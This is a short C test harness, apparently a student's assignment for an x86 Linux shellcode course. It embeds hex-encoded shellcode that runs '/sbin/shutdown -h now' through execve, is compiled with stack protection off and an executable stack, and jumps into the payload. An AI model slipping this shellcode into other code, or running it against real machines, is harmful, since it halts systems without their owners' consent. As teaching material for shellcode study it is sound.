// Student ID     : SLAE-1250
// Student Name   : Jonathan "Chops" Crosby
// Assignment 6.3 : Shell Code Test File
// File Name      : shutdown.c

#include<stdio.h>
#include<string.h>

//compile with: gcc shutdown.c -o shutdown -fno-stack-protector -z execstack

unsigned char code[] = \
"\x31\xc9\xf7\xe1\x50\x66\x68\x2d\x68\x89\xe7\x6a\x6e\x66\xc7\x44\x24\x01\x6f\x77\x89\xe7\x52\x68\x64\x6f\x77\x6e\x68\x73\x68\x75\x74\x68\x6e\x2f\x2f\x2f\x68\x2f\x73\x62\x69\x89\xe3\x50\x57\x53\x89\xe1\x83\xc0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
